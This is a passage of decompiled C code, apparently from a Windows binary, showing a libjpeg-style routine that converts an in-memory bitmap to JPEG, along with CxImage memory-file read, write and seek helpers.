  }
  if (0 < param_2) {
    for (; *(int *)(iVar2 + 0x18) < param_2; param_2 = param_2 - iVar1) {
      iVar1 = *(int *)(iVar2 + 0x18);
      FUN_00408a40(param_1);
    }
    *(int *)(iVar2 + 0x14) = *(int *)(iVar2 + 0x14) + param_2;
    *(int *)(iVar2 + 0x18) = *(int *)(iVar2 + 0x18) - param_2;
  }
  return;
}



void FUN_00408aec(void)

{
  return;
}



void __cdecl FUN_00408aed(int param_1,int param_2)

{
  undefined uVar1;
  int iVar2;
  undefined *puVar3;
  
  if (param_1 != 0) {
    if (0x10df < param_2) {
      param_2 = 0x10e0;
    }
    if (0 < param_2) {
      puVar3 = (undefined *)(param_1 + 2);
      iVar2 = (param_2 - 1U) / 3 + 1;
      do {
        uVar1 = puVar3[-2];
        puVar3[-2] = *puVar3;
        *puVar3 = uVar1;
        puVar3 = puVar3 + 3;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
  }
  return;
}



int __thiscall FUN_00408b2f(void *this,undefined4 param_1)

{
  void *pvVar1;
  
  *(undefined4 *)((int)this + 0x14) = 0;
  *(undefined4 *)((int)this + 0x18) = 0;
  *(undefined4 *)((int)this + 0x30) = param_1;
  *(undefined **)((int)this + 8) = &LAB_00408980;
  *(code **)((int)this + 0xc) = FUN_00408994;
  *(code **)((int)this + 0x10) = FUN_004089d2;
  *(undefined **)((int)this + 0x1c) = &LAB_00408a29;
  *(code **)((int)this + 0x20) = FUN_00408a40;
  *(code **)((int)this + 0x24) = FUN_00408ab4;
  *(code **)((int)this + 0x28) = FUN_00408f87;
  *(code **)((int)this + 0x2c) = FUN_00408aec;
  pvVar1 = operator_new(0x1000);
  *(void **)((int)this + 0x34) = pvVar1;
  return (int)this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3

void __cdecl FUN_00408b8d(void *param_1,uint param_2,int param_3,void *param_4,uint *param_5)

{
  undefined *puVar1;
  int iVar2;
  undefined *puVar3;
  uint uVar4;
  size_t _Size;
  undefined local_2d4 [52];
  void *local_2a0;
  undefined4 local_298 [6];
  undefined4 local_280;
  int local_27c;
  uint local_278;
  undefined4 local_272;
  uint local_26c;
  uint *local_254;
  int local_250;
  void *local_24c;
  void **local_248;
  void *local_244;
  undefined4 local_23c;
  code *local_238 [49];
  void *local_174;
  int local_170;
  int local_16c;
  undefined *local_158;
  int local_154;
  uint local_150;
  uint local_14c;
  undefined4 local_148;
  int local_12c;
  undefined local_a9;
  undefined2 local_a8;
  undefined2 local_a6;
  uint local_a0;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)local_238;
  local_238[0] = (code *)0x90;
  local_23c = 0x408bb4;
  local_24c = param_4;
  local_254 = param_5;
  if (((param_1 != (void *)0x0) && (0x27 < param_2)) && (param_4 != (void *)0x0)) {
    iVar2 = 10;
    if ((param_3 < 10) || (iVar2 = 100, 100 < param_3)) {
      param_3 = iVar2;
    }
    _memset(&local_280,0,0x2c);
    _memcpy(&local_280,param_1,0x2c);
    local_250 = (int)param_1 + 0x28;
    local_280 = 0x28;
    if (((ushort)local_272 & 0xfff8) == 0x20) {
      local_26c = local_26c >> 2;
      if (local_26c != 0) {
        puVar1 = (undefined *)((int)param_1 + 0x2a);
        puVar3 = puVar1;
        uVar4 = local_26c;
        do {
          puVar1[-2] = puVar3[-2];
          puVar1[-1] = puVar3[-1];
          *puVar1 = *puVar3;
          puVar3 = puVar3 + 4;
          puVar1 = puVar1 + 3;
          uVar4 = uVar4 - 1;
        } while (uVar4 != 0);
      }
      local_26c = local_26c * 3;
      local_272 = CONCAT22(local_272._2_2_,0x18);
    }
    local_174 = operator_new(0x100);
    local_170 = FUN_00409d5b(local_238);
    local_238[0] = FUN_00408aec;
    FUN_0040937d(&local_170,0x3e,0x168);
    FUN_0040908d(local_298,0,0);
    local_23c = 0;
    FUN_004090d8((int)local_298);
    FUN_00408b2f(local_2d4,local_298);
    local_158 = local_2d4;
    local_154 = local_27c;
    local_150 = local_278;
    local_14c = local_272 >> 3 & 0x1fff;
    local_23c = CONCAT31(local_23c._1_3_,1);
    local_148 = 2;
    FUN_00409b37(&local_170);
    FUN_0040978c(&local_170,param_3,'\0');
    *(undefined4 *)(local_12c + 8) = 2;
    *(undefined4 *)(local_12c + 0xc) = 2;
    *(undefined4 *)(local_12c + 0x5c) = 1;
    *(undefined4 *)(local_12c + 0x60) = 1;
    *(undefined4 *)(local_12c + 0xb0) = 1;
    *(undefined4 *)(local_12c + 0xb4) = 1;
    local_a8 = 0x60;
    local_a9 = 1;
    local_a6 = local_a8;
    FUN_0040956c(&local_170,'\x01');
    iVar2 = (local_272 & 0xffff) * local_27c;
    _Size = (int)(iVar2 + (iVar2 >> 0x1f & 7U)) >> 3;
    local_248 = (void **)(**(code **)(local_16c + 8))(&local_170,1,_Size + 8,1);
    local_27c = (local_272 & 0xffff) * local_27c;
    while (local_a0 < local_150) {
      _memcpy(*local_248,
              (void *)((((int)(local_27c + (local_27c >> 0x1f & 7U)) >> 3) * (local_278 - 1) -
                       local_a0 * _Size) + local_250),_Size);
      FUN_00408aed((int)*local_248,_Size);
      FUN_004095d8(&local_170,local_248,1);
    }
    FUN_00409480(&local_170);
    thunk_FUN_00409dda((int)&local_170);
    FUN_0040916a(local_298,0,0);
    uVar4 = FUN_004091b4((int)local_298);
    *local_254 = uVar4;
    FUN_0040910b(local_298,local_24c,uVar4,1);
    FUN_004090b5((int)local_298);
    FUN_0040fb79(local_174);
    local_23c = local_23c & 0xffffff00;
    FUN_0040fb79(local_2a0);
    local_23c = 0xffffffff;
    FUN_004092a6(local_298);
  }
  ExceptionList = local_244;
  ___security_check_cookie_4(local_8 ^ (uint)local_238);
  return;
}



undefined4 __cdecl FUN_00408eb0(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  
  ppbVar2 = (byte **)param_1[6];
  pbVar4 = ppbVar2[1];
  pbVar5 = *ppbVar2;
  do {
    if (pbVar4 == (byte *)0x0) {
      uVar3 = (*(code *)ppbVar2[3])(param_1);
      if ((char)uVar3 == '\0') {
LAB_00408f29:
        return uVar3 & 0xffffff00;
      }
      pbVar5 = *ppbVar2;
      pbVar4 = ppbVar2[1];
    }
    bVar1 = *pbVar5;
    pbVar4 = pbVar4 + -1;
    pbVar5 = pbVar5 + 1;
    if (bVar1 == 0xff) {
      do {
        if (pbVar4 == (byte *)0x0) {
          uVar3 = (*(code *)ppbVar2[3])(param_1);
          if ((char)uVar3 == '\0') goto LAB_00408f29;
          pbVar5 = *ppbVar2;
          pbVar4 = ppbVar2[1];
        }
        uVar3 = (uint)*pbVar5;
        pbVar4 = pbVar4 + -1;
        pbVar5 = pbVar5 + 1;
      } while (uVar3 == 0xff);
      if (uVar3 != 0) {
        if (*(int *)(param_1[0x65] + 0x14) != 0) {
          *(undefined4 *)(*param_1 + 0x14) = 0x74;
          *(undefined4 *)(*param_1 + 0x18) = *(undefined4 *)(param_1[0x65] + 0x14);
          *(uint *)(*param_1 + 0x1c) = uVar3;
          (**(code **)(*param_1 + 4))(param_1,0xffffffff);
          *(undefined4 *)(param_1[0x65] + 0x14) = 0;
        }
        param_1[0x5f] = uVar3;
        *ppbVar2 = pbVar5;
        ppbVar2[1] = pbVar4;
        return CONCAT31((int3)((uint)param_1 >> 8),1);
      }
      *(int *)(param_1[0x65] + 0x14) = *(int *)(param_1[0x65] + 0x14) + 2;
    }
    else {
      *(int *)(param_1[0x65] + 0x14) = *(int *)(param_1[0x65] + 0x14) + 1;
    }
    ppbVar2[1] = pbVar4;
    *ppbVar2 = pbVar5;
  } while( true );
}



undefined4 __cdecl FUN_00408f87(int *param_1,int param_2)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  
  iVar3 = param_1[0x5f];
  *(undefined4 *)(*param_1 + 0x14) = 0x79;
  *(int *)(*param_1 + 0x18) = iVar3;
  *(int *)(*param_1 + 0x1c) = param_2;
  (**(code **)(*param_1 + 4))(param_1,0xffffffff);
  do {
    if (iVar3 < 0xc0) {
LAB_00408fbe:
      iVar4 = 2;
    }
    else if (((iVar3 - 0xd0U < 8) && (iVar3 != (param_2 + 1U & 7) + 0xd0)) &&
            (iVar3 != (param_2 + 2U & 7) + 0xd0)) {
      if ((iVar3 == (param_2 - 1U & 7) + 0xd0) || (iVar3 == (param_2 - 2U & 7) + 0xd0))
      goto LAB_00408fbe;
      iVar4 = 1;
    }
    else {
      iVar4 = 3;
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x61;
    *(int *)(*param_1 + 0x18) = iVar3;
    *(int *)(*param_1 + 0x1c) = iVar4;
    uVar1 = (**(code **)(*param_1 + 4))(param_1,4);
    if (iVar4 == 1) {
      param_1[0x5f] = 0;
      goto LAB_00409051;
    }
    if (iVar4 == 2) {
      uVar2 = FUN_00408eb0(param_1);
      if ((char)uVar2 == '\0') {
        return uVar2 & 0xffffff00;
      }
      iVar3 = param_1[0x5f];
    }
    else if (iVar4 == 3) {
LAB_00409051:
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
  } while( true );
}



undefined4 __fastcall FUN_00409058(int *param_1,undefined param_2,undefined param_3)

{
  int iVar1;
  
  iVar1 = (**(code **)(*param_1 + 0xc))(&param_3,1,1);
  return CONCAT31((int3)((uint)-(iVar1 + -1) >> 8),'\x01' - (iVar1 + -1 != 0));
}



undefined4 * __thiscall FUN_00409070(void *this,byte param_1)

{
  *(undefined ***)this = CxFile::vftable;
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (undefined4 *)this;
}



void __thiscall FUN_0040908d(void *this,int param_1,undefined4 param_2)

{
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 0x14) = param_2;
  *(undefined4 *)((int)this + 8) = param_2;
  *(undefined ***)this = CxMemFile::vftable;
  *(int *)((int)this + 4) = param_1;
  *(bool *)((int)this + 0xc) = param_1 == 0;
  return;
}



undefined4 __fastcall FUN_004090b5(int param_1)

{
  void *_Memory;
  
  _Memory = *(void **)(param_1 + 4);
  if ((_Memory != (void *)0x0) && (*(char *)(param_1 + 0xc) != '\0')) {
    _free(_Memory);
    *(undefined4 *)(param_1 + 4) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
  }
  return CONCAT31((int3)((uint)_Memory >> 8),1);
}



bool __fastcall FUN_004090d8(int param_1)

{
  void *pvVar1;
  
  if (*(int *)(param_1 + 4) != 0) {
    return false;
  }
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  pvVar1 = _malloc(1);
  *(void **)(param_1 + 4) = pvVar1;
  *(undefined *)(param_1 + 0xc) = 1;
  return pvVar1 != (void *)0x0;
}



uint __thiscall FUN_0040910b(void *this,void *param_1,uint param_2,int param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  
  if ((param_1 == (void *)0x0) || (*(int *)((int)this + 4) == 0)) {
    uVar3 = 0;
  }
  else {
    iVar1 = *(int *)((int)this + 0x10);
    iVar2 = *(int *)((int)this + 8);
    if ((iVar1 < iVar2) && (uVar3 = param_2 * param_3, uVar3 != 0)) {
      if (iVar2 < (int)(iVar1 + uVar3)) {
        uVar3 = iVar2 - iVar1;
      }
      _memcpy(param_1,(void *)(iVar1 + *(int *)((int)this + 4)),uVar3);
      *(int *)((int)this + 0x10) = *(int *)((int)this + 0x10) + uVar3;
      uVar3 = uVar3 / param_2;
    }
    else {
      uVar3 = 0;
    }
  }
  return uVar3;
}



uint __thiscall FUN_0040916a(void *this,int param_1,int param_2)

{
  uint in_EAX;
  uint uVar1;
  
  if (*(int *)((int)this + 4) == 0) {
LAB_004091a0:
    uVar1 = in_EAX & 0xffffff00;
  }
  else {
    in_EAX = *(uint *)((int)this + 0x10);
    if (param_2 != 0) {
      if (param_2 != 1) {
        if (param_2 != 2) goto LAB_004091a0;
        in_EAX = *(uint *)((int)this + 8);
      }
      param_1 = in_EAX + param_1;
    }
    if (param_1 < 0) {
      param_1 = 0;
    }
    *(int *)((int)this + 0x10) = param_1;
    uVar1 = CONCAT31((int3)((uint)param_1 >> 8),1);
  }
  return uVar1;
}



undefined4 __fastcall FUN_004091a6(int param_1)

{
  if (*(int *)(param_1 + 4) == 0) {
    return 0xffffffff;
  }
  return *(undefined4 *)(param_1 + 0x10);
}



undefined4 __fastcall FUN_004091b4(int param_1)

{
  if (*(int *)(param_1 + 4) == 0) {
    return 0xffffffff;
  }
  return *(undefined4 *)(param_1 + 8);
}



bool __fastcall FUN_004091c2(int param_1)

{
  return *(int *)(param_1 + 4) != 0;
}



bool __fastcall FUN_004091ca(int param_1)

{
  if (*(int *)(param_1 + 4) == 0) {
    return true;
  }
  return *(int *)(param_1 + 8) <= *(int *)(param_1 + 0x10);
}



uint __fastcall FUN_004091e1(int param_1)

{
  if (*(int *)(param_1 + 4) == 0) {
    return 0xffffffff;
  }
  return (uint)(*(int *)(param_1 + 8) < *(int *)(param_1 + 0x10));
}



uint __fastcall FUN_004091f9(int *param_1)

{
  byte bVar1;
  char cVar2;
  
  cVar2 = (**(code **)(*param_1 + 0x20))();
  if (cVar2 != '\0') {
    return 0xffffffff;
  }
  bVar1 = *(byte *)(param_1[1] + param_1[4]);
  param_1[4] = param_1[4] + 1;
  return (uint)bVar1;
}



int __thiscall FUN_0040921a(void *this,int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if (0 < param_2 + -1) {
    do {
                    // WARNING: Load size is inaccurate
      iVar1 = (**(code **)(*this + 0x2c))();
      if (iVar1 == -1) {
        return 0;
      }
      *(char *)(iVar2 + param_1) = (char)iVar1;
      iVar2 = iVar2 + 1;
    } while ((iVar1 != 10) && (iVar2 < param_2 + -1));
  }
  *(undefined *)(iVar2 + param_1) = 0;
  return param_1;
}



undefined4 FUN_0040925a(void)

{
  return 0;
}



bool __thiscall FUN_0040925f(void *this,uint param_1)

{
  size_t _NewSize;
  void *pvVar1;
  
  if (*(uint *)((int)this + 0x14) < param_1) {
    _NewSize = (param_1 & 0xffff0000) + 0x10000;
    if (*(void **)((int)this + 4) == (void *)0x0) {
      pvVar1 = _malloc(_NewSize);
    }
    else {
      pvVar1 = _realloc(*(void **)((int)this + 4),_NewSize);
    }
    *(size_t *)((int)this + 0x14) = _NewSize;
    *(void **)((int)this + 4) = pvVar1;
    *(undefined *)((int)this + 0xc) = 1;
  }
  return *(int *)((int)this + 4) != 0;
}



void __fastcall FUN_004092a6(undefined4 *param_1)

{
  *param_1 = CxMemFile::vftable;
  FUN_004090b5((int)param_1);
  *param_1 = CxFile::vftable;
  return;
}



int __thiscall FUN_004092bc(void *this,void *param_1,int param_2,int param_3)

{
  bool bVar1;
  uint uVar2;
  size_t _Size;
  
  if ((*(int *)((int)this + 4) == 0) || (param_1 == (void *)0x0)) {
    param_3 = 0;
  }
  else {
    _Size = param_2 * param_3;
    if ((_Size == 0) ||
       ((uVar2 = *(int *)((int)this + 0x10) + _Size, *(int *)((int)this + 0x14) < (int)uVar2 &&
        (bVar1 = FUN_0040925f(this,uVar2), !bVar1)))) {
      param_3 = 0;
    }
    else {
      _memcpy((void *)(*(int *)((int)this + 0x10) + *(int *)((int)this + 4)),param_1,_Size);
      *(int *)((int)this + 0x10) = *(int *)((int)this + 0x10) + _Size;
      if (*(int *)((int)this + 8) < *(int *)((int)this + 0x10)) {
        *(int *)((int)this + 8) = *(int *)((int)this + 0x10);
      }
    }
  }
  return param_3;
}



uint __thiscall FUN_00409320(void *this,undefined param_1)

{
  int iVar1;
  bool bVar2;
  uint in_EAX;
  uint uVar3;
  undefined3 extraout_var;
  
  if (*(int *)((int)this + 4) == 0) {
LAB_00409329:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    if (*(int *)((int)this + 0x14) <= *(int *)((int)this + 0x10)) {
      bVar2 = FUN_0040925f(this,*(int *)((int)this + 0x10) + 1);
      in_EAX = CONCAT31(extraout_var,bVar2);
      if (!bVar2) goto LAB_00409329;
    }
    *(undefined *)(*(int *)((int)this + 0x10) + *(int *)((int)this + 4)) = param_1;
    *(int *)((int)this + 0x10) = *(int *)((int)this + 0x10) + 1;
    iVar1 = *(int *)((int)this + 0x10);
    if (*(int *)((int)this + 8) < iVar1) {
      *(int *)((int)this + 8) = iVar1;
    }
    uVar3 = CONCAT31((int3)((uint)iVar1 >> 8),1);
  }
  return uVar3;
}



undefined4 * __thiscall FUN_00409361(void *this,byte param_1)

{
  FUN_004092a6((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (undefined4 *)this;
}



void __cdecl FUN_0040937d(int *param_1,int param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  
  param_1[1] = 0;
  if (param_2 != 0x3e) {
    *(undefined4 *)(*param_1 + 0x14) = 0xc;
    *(undefined4 *)(*param_1 + 0x18) = 0x3e;
    *(int *)(*param_1 + 0x1c) = param_2;
    (**(code **)*param_1)(param_1);
  }
  if (param_3 != 0x168) {
    *(undefined4 *)(*param_1 + 0x14) = 0x15;
    *(undefined4 *)(*param_1 + 0x18) = 0x168;
    *(int *)(*param_1 + 0x1c) = param_3;
    (**(code **)*param_1)(param_1);
  }
  iVar3 = param_1[3];
  iVar1 = *param_1;
  _memset(param_1,0,0x168);
  *param_1 = iVar1;
  param_1[3] = iVar3;
  *(undefined *)(param_1 + 4) = 0;
  FUN_0040a81b(param_1);
  param_1[2] = 0;
  param_1[6] = 0;
  param_1[0x11] = 0;
  param_1[0x12] = 0;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  iVar3 = 4;
  param_1[0x15] = 0;
  piVar2 = param_1 + 0x1a;
  do {
    piVar2[-4] = 0;
    *piVar2 = 0;
    piVar2 = piVar2 + 1;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  param_1[0x58] = 0;
  *(undefined8 *)(param_1 + 0xc) = 0x3ff0000000000000;
  param_1[5] = 100;
  return;
}



void __cdecl thunk_FUN_00409dda(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x28))(param_1);
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



void __cdecl FUN_00409436(int param_1,undefined param_2)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(param_1 + 0x48);
  iVar2 = 4;
  do {
    if (*piVar1 != 0) {
      *(undefined *)(*piVar1 + 0x80) = param_2;
    }
    piVar1 = piVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  piVar1 = (int *)(param_1 + 0x68);
  iVar2 = 4;
  do {
    if (piVar1[-4] != 0) {
      *(undefined *)(piVar1[-4] + 0x111) = param_2;
    }
    if (*piVar1 != 0) {
      *(undefined *)(*piVar1 + 0x111) = param_2;
    }
    piVar1 = piVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void __cdecl FUN_00409480(int *param_1)

{
  int iVar1;
  code **ppcVar2;
  char cVar3;
  uint uVar4;
  
  iVar1 = param_1[5];
  if ((iVar1 == 0x65) || (iVar1 == 0x66)) {
    if ((uint)param_1[0x34] < (uint)param_1[8]) {
      *(undefined4 *)(*param_1 + 0x14) = 0x43;
      (**(code **)*param_1)(param_1);
    }
    (**(code **)(param_1[0x4f] + 8))(param_1);
  }
  else if (iVar1 != 0x67) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  ppcVar2 = (code **)param_1[0x4f];
  cVar3 = *(char *)((int)ppcVar2 + 0xd);
  while (cVar3 == '\0') {
    (**ppcVar2)(param_1);
    uVar4 = 0;
    if (param_1[0x38] != 0) {
      do {
        if (param_1[2] != 0) {
          *(uint *)(param_1[2] + 4) = uVar4;
          *(int *)(param_1[2] + 8) = param_1[0x38];
          (**(code **)param_1[2])(param_1);
        }
        cVar3 = (**(code **)(param_1[0x52] + 4))(param_1,0);
        if (cVar3 == '\0') {
          *(undefined4 *)(*param_1 + 0x14) = 0x18;
          (**(code **)*param_1)(param_1);
        }
        uVar4 = uVar4 + 1;
      } while (uVar4 < (uint)param_1[0x38]);
    }
    (**(code **)(param_1[0x4f] + 8))(param_1);
    ppcVar2 = (code **)param_1[0x4f];
    cVar3 = *(char *)((int)ppcVar2 + 0xd);
  }
  (**(code **)(param_1[0x53] + 0xc))(param_1);
  (**(code **)(param_1[6] + 0x10))(param_1);
  FUN_00409da7((int)param_1);
  return;
}



void __cdecl FUN_0040956c(int *param_1,char param_2)

{
  if (param_1[5] != 100) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  if (param_2 != '\0') {
    FUN_00409436((int)param_1,0);
  }
  (**(code **)(*param_1 + 0x10))(param_1);
  (**(code **)(param_1[6] + 8))(param_1);
  FUN_0040b09c(param_1);
  (**(code **)param_1[0x4f])(param_1);
  param_1[0x34] = 0;
  param_1[5] = (*(char *)(param_1 + 0x2c) != '\0') + 0x65;
  return;
}



void __cdecl FUN_004095d8(int *param_1,undefined4 param_2,uint param_3)

{
  int *piVar1;
  
  piVar1 = param_1;
  if (param_1[5] != 0x65) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  if ((uint)piVar1[8] <= (uint)piVar1[0x34]) {
    *(undefined4 *)(*piVar1 + 0x14) = 0x7b;
    (**(code **)(*piVar1 + 4))(piVar1,0xffffffff);
  }
  if (piVar1[2] != 0) {
    *(int *)(piVar1[2] + 4) = piVar1[0x34];
    *(int *)(piVar1[2] + 8) = piVar1[8];
    (**(code **)piVar1[2])(piVar1);
  }
  if (*(char *)(piVar1[0x4f] + 0xc) != '\0') {
    (**(code **)(piVar1[0x4f] + 4))(piVar1);
  }
  if ((uint)(piVar1[8] - piVar1[0x34]) < param_3) {
    param_3 = piVar1[8] - piVar1[0x34];
  }
  param_1 = (int *)0x0;
  (**(code **)(piVar1[0x50] + 4))(piVar1,param_2,&param_1,param_3);
  piVar1[0x34] = piVar1[0x34] + (int)param_1;
  return;
}



void __cdecl FUN_00409683(int *param_1,int param_2,int *param_3,int param_4,char param_5)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  if (param_1[5] != 100) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  if ((param_2 < 0) || (3 < param_2)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x1f;
    *(int *)(*param_1 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  piVar1 = param_1 + param_2 + 0x12;
  if (*piVar1 == 0) {
    iVar2 = FUN_00409df5((int)param_1);
    *piVar1 = iVar2;
  }
  iVar2 = 0;
  do {
    iVar3 = (*param_3 * param_4 + 0x32) / 100;
    if (iVar3 < 1) {
      iVar3 = 1;
    }
    if (0x7fff < iVar3) {
      iVar3 = 0x7fff;
    }
    if ((param_5 != '\0') && (0xff < iVar3)) {
      iVar3 = 0xff;
    }
    *(short *)(iVar2 + *piVar1) = (short)iVar3;
    param_3 = param_3 + 1;
    iVar2 = iVar2 + 2;
  } while (iVar2 < 0x80);
  *(undefined *)(*piVar1 + 0x80) = 0;
  return;
}



void __cdecl FUN_00409733(int *param_1,int param_2,char param_3)

{
  FUN_00409683(param_1,0,(int *)&DAT_00423378,param_2,param_3);
  FUN_00409683(param_1,1,(int *)&DAT_00423478,param_2,param_3);
  return;
}



int __cdecl FUN_00409765(int param_1)

{
  if (param_1 < 1) {
    param_1 = 1;
  }
  if (100 < param_1) {
    param_1 = 100;
  }
  if (param_1 < 0x32) {
    return (int)(5000 / (longlong)param_1);
  }
  return (100 - param_1) * 2;
}



void __cdecl FUN_0040978c(int *param_1,int param_2,char param_3)

{
  int iVar1;
  
  iVar1 = FUN_00409765(param_2);
  FUN_00409733(param_1,iVar1,param_3);
  return;
}



void __cdecl FUN_004097a8(int *param_1,void *param_2)

{
  void *pvVar1;
  int iVar2;
  void *unaff_EBX;
  void **unaff_ESI;
  size_t _Size;
  
  _Size = 0;
  if (*unaff_ESI == (void *)0x0) {
    pvVar1 = (void *)FUN_00409e11((int)param_1);
    *unaff_ESI = pvVar1;
  }
  _memcpy(*unaff_ESI,unaff_EBX,0x11);
  iVar2 = 1;
  do {
    _Size = _Size + *(byte *)(iVar2 + (int)unaff_EBX);
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x11);
  if (((int)_Size < 1) || (0x100 < (int)_Size)) {
    *(undefined4 *)(*param_1 + 0x14) = 8;
    (**(code **)*param_1)(param_1);
  }
  _memcpy((void *)((int)*unaff_ESI + 0x11),param_2,_Size);
  *(undefined *)((int)*unaff_ESI + 0x111) = 0;
  return;
}



void FUN_00409815(void)

{
  int *unaff_EDI;
  
  FUN_004097a8(unaff_EDI,&DAT_0042358c);
  FUN_004097a8(unaff_EDI,&DAT_004235d0);
  FUN_004097a8(unaff_EDI,&DAT_004235ac);
  FUN_004097a8(unaff_EDI,&DAT_00423688);
  return;
}



void __cdecl FUN_00409869(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  
  if (param_1[5] != 100) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  param_1[0x10] = param_2;
  *(undefined *)(param_1 + 0x31) = 0;
  *(undefined *)(param_1 + 0x33) = 0;
  if (param_2 == 0) {
    iVar2 = param_1[9];
    param_1[0xf] = iVar2;
    if ((iVar2 < 1) || (10 < iVar2)) {
      *(undefined4 *)(*param_1 + 0x14) = 0x1a;
      *(int *)(*param_1 + 0x18) = param_1[0xf];
      *(undefined4 *)(*param_1 + 0x1c) = 10;
      (**(code **)*param_1)(param_1);
    }
    iVar2 = 0;
    if (param_1[0xf] < 1) {
      return;
    }
    iVar3 = 0;
    do {
      piVar1 = (int *)(param_1[0x11] + iVar3);
      *piVar1 = iVar2;
      iVar2 = iVar2 + 1;
      piVar1[2] = 1;
      piVar1[3] = 1;
      piVar1[4] = 0;
      piVar1[5] = 0;
      piVar1[6] = 0;
      iVar3 = iVar3 + 0x54;
    } while (iVar2 < param_1[0xf]);
    return;
  }
  if (param_2 == 1) {
    *(undefined *)(param_1 + 0x31) = 1;
    param_1[0xf] = 1;
    puVar4 = (undefined4 *)param_1[0x11];
    *puVar4 = 1;
  }
  else if (param_2 == 2) {
    puVar4 = (undefined4 *)param_1[0x11];
    param_1[0xf] = 3;
    *(undefined *)(param_1 + 0x33) = 1;
    *puVar4 = 0x52;
    puVar4[2] = 1;
    puVar4[3] = 1;
    puVar4[4] = 0;
    puVar4[5] = 0;
    puVar4[6] = 0;
    iVar2 = param_1[0x11];
    *(undefined4 *)(iVar2 + 0x54) = 0x47;
    *(undefined4 *)(iVar2 + 0x5c) = 1;
    *(undefined4 *)(iVar2 + 0x60) = 1;
    *(undefined4 *)(iVar2 + 100) = 0;
    *(undefined4 *)(iVar2 + 0x68) = 0;
    *(undefined4 *)(iVar2 + 0x6c) = 0;
    puVar4 = (undefined4 *)(param_1[0x11] + 0xa8);
    *puVar4 = 0x42;
  }
  else {
    if (param_2 == 3) {
      puVar4 = (undefined4 *)param_1[0x11];
      param_1[0xf] = 3;
      *(undefined *)(param_1 + 0x31) = 1;
      *puVar4 = 1;
      puVar4[4] = 0;
      puVar4[5] = 0;
      puVar4[6] = 0;
      puVar4[2] = 2;
      puVar4[3] = 2;
      iVar2 = param_1[0x11];
      *(undefined4 *)(iVar2 + 0x54) = 2;
      *(undefined4 *)(iVar2 + 0x5c) = 1;
      *(undefined4 *)(iVar2 + 0x60) = 1;
      *(undefined4 *)(iVar2 + 100) = 1;
      *(undefined4 *)(iVar2 + 0x68) = 1;
      *(undefined4 *)(iVar2 + 0x6c) = 1;
      iVar2 = param_1[0x11];
      *(undefined4 *)(iVar2 + 0xa8) = 3;
      *(undefined4 *)(iVar2 + 0xb0) = 1;
      *(undefined4 *)(iVar2 + 0xb4) = 1;
      *(undefined4 *)(iVar2 + 0xb8) = 1;
      *(undefined4 *)(iVar2 + 0xbc) = 1;
      *(undefined4 *)(iVar2 + 0xc0) = 1;
      return;
    }
    if (param_2 != 4) {
      if (param_2 != 5) {
        *(undefined4 *)(*param_1 + 0x14) = 10;
        (**(code **)*param_1)(param_1);
        return;
      }
      puVar4 = (undefined4 *)param_1[0x11];
      param_1[0xf] = 4;
      *(undefined *)(param_1 + 0x33) = 1;
      *puVar4 = 1;
      puVar4[4] = 0;
      puVar4[5] = 0;
      puVar4[6] = 0;
      puVar4[2] = 2;
      puVar4[3] = 2;
      iVar2 = param_1[0x11];
      *(undefined4 *)(iVar2 + 0x5c) = 1;
      *(undefined4 *)(iVar2 + 0x60) = 1;
      *(undefined4 *)(iVar2 + 100) = 1;
      *(undefined4 *)(iVar2 + 0x68) = 1;
      *(undefined4 *)(iVar2 + 0x6c) = 1;
      *(undefined4 *)(iVar2 + 0x54) = 2;
      iVar2 = param_1[0x11];
      *(undefined4 *)(iVar2 + 0xa8) = 3;
      *(undefined4 *)(iVar2 + 0xb0) = 1;
      *(undefined4 *)(iVar2 + 0xb4) = 1;
      *(undefined4 *)(iVar2 + 0xb8) = 1;
      *(undefined4 *)(iVar2 + 0xbc) = 1;
